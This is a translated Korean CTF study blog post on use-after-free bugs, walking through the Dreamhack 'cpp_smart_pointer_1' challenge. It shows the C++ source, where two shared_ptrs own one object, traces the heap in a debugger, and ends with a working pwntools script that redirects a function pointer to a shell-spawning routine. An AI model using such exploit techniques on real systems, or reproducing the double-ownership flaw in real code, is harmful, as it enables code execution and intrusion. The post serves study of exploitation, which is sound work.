---
title: "[PWNABLE] Use After Free"
description: "Use After Free (UAF) vulnerability is a security vulnerability that occurs when a pointer that has been freed after memory allocation is still used. This is an error that occurs in memory management, and an attacker can exploit it to cause abnormal operation of the program or execute arbitrary code. Memory is allocated through malloc, etc., and freed through free."
date: "2024-06-24"
translation_key: "tistory-2656f66a8685"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Use-After-Free"
private: false
---

Use After Free (UAF) vulnerability is a security vulnerability that occurs when a pointer that has been freed after memory allocation is still used. This is an error that occurs in memory management, and an attacker can exploit it to cause abnormal operation of the program or execute arbitrary code.

Memory is allocated through malloc, etc., and freed through free. Freed memory can be reused for other purposes. However, if the released pointer continues to be used, it is called **Dangling Pointer**.

![](/assets/images/tistory/tistory-2656f66a8685/001.png)

• **Step 1**: Memory allocation (malloc)

• **Step 2**: Free memory

• **Step 3**: Freed pointer is reused (Dangling Pointer)

The data area of the allocated chunk corresponds to the header part of the freed chunk.

In other words, the freed chunk regains the data area it was allocated at the time, excluding the fd and bk areas.

And if you allocate a chunk of the same size, the freed chunk is allocated again, making it possible to access the previously existing data or the contents of fd and bk.

* * *

#### dreamhack cpp\_smart\_pointer\_1

Since I don't know C++ well, I couldn't understand the code properly.

```
int main(){
    initialize();
    int selector = 0;
    Smart *smart = new Smart();
    std::shared_ptr<Smart> src_ptr(smart);
    std::shared_ptr<Smart> new_ptr(smart);
    while(1){
        print_menu();
        std::cin >> selector;
        switch(selector){
            case 1:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    change_pointer(src_ptr); // free
                } else if(selector == 2){
                    change_pointer(new_ptr);
                }
                break;
            case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
            case 3:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    (*src_ptr).fp();
                } else if(selector == 2){
                    (*new_ptr).fp();
                }
                break;
            case 4:
                write_guestbook();
                break;
            case 5:
                view_guestbook();
                break;
            case 6:
                return 0;
                break;
            default:
                break;
        }
    }
}
```

If you look at the main function, it functions to call a function using a switch statement, release the heap area, and execute new/src\_ptr.fp().

And if you look at the top, there are friends called smart/

```
Smart *smart = new Smart();
std::shared_ptr<Smart> src_ptr(smart);
std::shared_ptr<Smart> new_ptr(smart);
```

To be honest, this is something I still don’t fully understand.

I know it's a concept such as automatically pointing to arguments, but I haven't handled it properly yet;;

First of all, I don't know much about the function, but the heap is allocated when each function is performed.

![](/assets/images/tistory/tistory-2656f66a8685/002.png)

Hmm... Let's take a look at other function functions first.

In case 1, a function called change\_pointer is executed.

```
void change_pointer(std::shared_ptr<Smart> first){
    int selector = 0;
    std::cout << "1. apple\n2. banana\n3. mango" << std::endl;
    std::cout << "select function for smart pointer: ";
    std::cin >> selector;
    (*first).change_function(selector);
    std::cout << std::endl;
}

//구조체 코드 중 일부
void change_function(int select){
        if(select == 1){
            fp = apple;
        } else if(select == 2){
            fp = banana;
        } else if(select == 3){
            fp = mango;
        } else {
            fp = apple;
        }
    }
```

This is the part that sets the functions for fp.

The function of each fruit name is defined as follows.

```
void apple(){
    std::cout << "Hi im apple!" << std::endl;
}

void banana(){
    std::cout << "Hi im banana!" << std::endl;
}

void mango(){
    std::cout << "Hi im mango!" << std::endl;
}
```

Then, just make this fp point to the function that obtains the shell.

```
void getshell(){
    std::cout << "Hi im shell!" << std::endl;
    std::cout << "what? shell?" << std::endl;
    system("/bin/sh");
}
```

In case 2, reset is being performed.

```
case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
```

I looked it up and found that it has a free function;;;

In case 3, the function in fp of the structure is executed.

```
case 3:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    (*src_ptr).fp();
                } else if(selector == 2){
                    (*new_ptr).fp();
                }
                break;
```

In case 4, the write\_guestbook function is called.

```
void write_guestbook(){
    std::string data;
    std::cout << "write guestbook : ";
    std::cin >> data;
    guest_book = (char *)malloc(data.length() + 1);
    strcpy(guest_book, data.c_str());
}
```

Hmm.... It seems like allocating the heap area with malloc and entering the value in the data part.

In case 5, view\_guestbook is called.

```
void view_guestbook(){
    std::cout << "guestbook data: ";
    std::cout << guest_book << std::endl;
}

//전역변수
char* guest_book = "guestbook\x00";
```

Prints the value in guest\_book.

The vulnerability occurs in case 2.

```
Smart *smart = new Smart();
std::shared_ptr<Smart> src_ptr(smart);
std::shared_ptr<Smart> new_ptr(smart);

...

case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
```

First of all, if the samrt pointer points to the same memory, a uaf or double free vulnerability occurs when only one or both are freed.

And in case 2, one of the two can be released.

In other words, when you free src\_ptr, you can access the freed area through new\_ptr.

If this is correct, it frees one of the two pointers and mallocs it again, exploiting the uaf vulnerability.

To be honest, I'm still not sure if it's because it's a cpp, but I'm not sure if it's smart and the heap is allocated.

![](/assets/images/tistory/tistory-2656f66a8685/003.png)

What is certain is that the two pointers created later have the same area, 0x616eb0.

0x402300 seems to refer to a smart pointer.

![](/assets/images/tistory/tistory-2656f66a8685/004.png)

And if you check the area, it contains the address of a function called apple.

![](/assets/images/tistory/tistory-2656f66a8685/005.png)

Now let's release one of the two pointers.

I only freed src\_ptr, but smart was also freed.

![](/assets/images/tistory/tistory-2656f66a8685/006.png)

If you check the memory, the two ptr's still point to smart.

![](/assets/images/tistory/tistory-2656f66a8685/007.png)

One of the two is free. 

Here, we will reassign src\_ptr.

![](/assets/images/tistory/tistory-2656f66a8685/008.png)

smart has not been allocated yet, but src\_ptr appears to have been allocated.

![](/assets/images/tistory/tistory-2656f66a8685/009.png)

The value was entered normally.

Here is what it looks like once again.

![](/assets/images/tistory/tistory-2656f66a8685/010.png)

It looks like it has even gone smart.

![](/assets/images/tistory/tistory-2656f66a8685/011.png)

If you check the value, you will see that the value you entered was entered correctly.

Since 0x606ea0 is a smart structure area, if the address of a function called getshell is entered in that data area,

You will get a shell when you call fp() on the structure.

```
from pwn import*

p = process('./cpp_smart_pointer_1')
e = ELF('cpp_smart_pointer_1')

pause()
p.sendlineafter(': ', '2')
p.sendlineafter(': ', '1')

pause()
p.sendlineafter(': ', '4')
p.sendlineafter(': ', 'a'*8)

pause()
p.sendlineafter(': ', '4')
p.sendlineafter(': ', p32(0x40161d))

pause()
p.sendlineafter(': ', '3')
p.sendlineafter(': ', '2')

p.interactive()
```

This is the entire payload. If you run it, you can get a shell like this:

![](/assets/images/tistory/tistory-2656f66a8685/012.png)